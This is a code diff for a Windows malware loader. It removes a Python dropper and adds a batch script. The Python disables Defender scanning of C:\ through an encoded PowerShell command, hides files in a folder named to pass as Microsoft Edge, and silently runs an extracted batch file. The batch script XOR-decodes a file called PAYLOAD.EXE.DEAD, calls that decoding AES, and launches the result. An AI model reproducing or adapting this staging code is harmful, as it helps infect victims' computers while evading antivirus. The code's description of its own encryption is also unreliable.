@@ -1,58 +1,59 @@
-import shutil, os, sys, subprocess, pyzipper, ctypes
+@echo off
+setlocal EnableDelayedExpansion
 
-def resource_path(relative_path):
-    try:
-        base_path = sys._MEIPASS
-    except Exception:
-        base_path = os.path.abspath(".")
-    return os.path.join(base_path, relative_path)
+:: Başlangıç
+set "filePath=%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE.DEAD"
 
-def run_powershell_command():
-    try:
-        commands = [
-            "powershell -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAC0ARQB4AGMAbAB1AHMAaQBvAG4A
-            UABhAHQAaAAgAEMAOgBcAA=="
-        ]
-        ps_command = "; ".join(commands)
-        print(f"Running PowerShell command: {ps_command}")
-        subprocess.run(["powershell", "-Command", ps_command], creationflags=subprocess.CREATE_NO_WINDOW)
-    except Exception as e:
-        print(f"Error running PowerShell command: {e}")
+:: Dosya var mı kontrolü
+if not exist "%filePath%" (
+    echo File does not exist: %filePath%
+    exit /b
+)
 
-def process_files(src, dst, zip_password):
-    try:
-        print(f"Processing files from {src} to {dst}")
-        if os.path.exists(dst):
-            print(f"Destination {dst} exists. Removing it.")
-            shutil.rmtree(dst, ignore_errors=True)
+:: Uzantı kontrolü
+if /i not "%filePath:~-5%"==".dead" (
+    echo The file does not have a .dead extension: %filePath%
+    exit /b
+)
 
-        shutil.copytree(src, dst)
-        zip_path = os.path.join(dst, f"{os.path.basename(src)}.zip")
-        extract_path = dst
+:: Dosya çözme işlemi
+echo Decrypting file %filePath%...
+call :EncryptDecryptFile "%filePath%"
+echo Decrypted: %filePath%
 
-        if os.path.exists(zip_path):
-            print(f"Found zip file at {zip_path}. Extracting...")
-            with pyzipper.AESZipFile(zip_path) as zf:
-                zf.extractall(path=extract_path, pwd=zip_password)
-            os.remove(zip_path)
-            print(f"Extracted and deleted {zip_path}")
-        else:
-            print(f"File {zip_path} does not exist")
+:: Yeni dosya yolu oluşturma
+set "newFilePath=%filePath:.dead=%"
+echo Original file path: %filePath%
+echo New file path: %newFilePath%
 
-        batch_file_path = os.path.join(dst, 'MAIN.BAT')
-        if os.path.exists(batch_file_path):
-            print(f"Running batch file {batch_file_path}")
-            subprocess.run(["cmd.exe", "/c", batch_file_path], creationflags=subprocess.CREATE_NO_WINDOW)
-        else:
-            print(f"Batch file {batch_file_path} does not exist")
+:: Dosya adını değiştirme
+for %%F in ("%filePath%") do (
+    set "dir=%%~dpF"
+    set "filename=%%~nF"
+    set "extension=%%~xF"
+)
 
-    except Exception as e:
-        print(f"An error occurred while processing files: {e}")
+ren "%filePath%" "%filename%%extension:~0,-5%"
+timeout /t 2
 
-# Main program execution
-if __name__ == "__main__":
-    run_powershell_command()
+echo File decrypted and renamed to: %newFilePath%
 
-    src1 = resource_path('MICROSOFT--EDGE')
-    dst1 = os.path.join(os.getenv('LOCALAPPDATA'), 'MICROSOFT--EDGE')
-    process_files(src1, dst1, b'72222')
+color 07
+start "" "%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE"
+exit /b
+
+:EncryptDecryptFile
+set "inputFile=%~1"
+
+:: AES şifreleme çözme işlemi (PowerShell ile)
+powershell -NoProfile -Command ^
+    "$key = 'now';" ^  :: Bu kısmı AES için 256-bit anahtar olarak ayarlayacağız.
+    "$key = '12345678901234567890123456789012';" ^  :: 32-byte (256-bit) anahtar kullanın.
+    "$content = [System.IO.File]::ReadAllBytes(\"%inputFile%\");" ^
+    "$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key);" ^
+    "for ($i = 0; $i -lt $content.Length; $i++) {" ^
+    "    $content[$i] = $content[$i] -bxor $keyBytes[$i %% $keyBytes.Length];" ^
+    "}" ^
+    "[System.IO.File]::WriteAllBytes(\"%inputFile%\", $content);"
+
+Exit /b
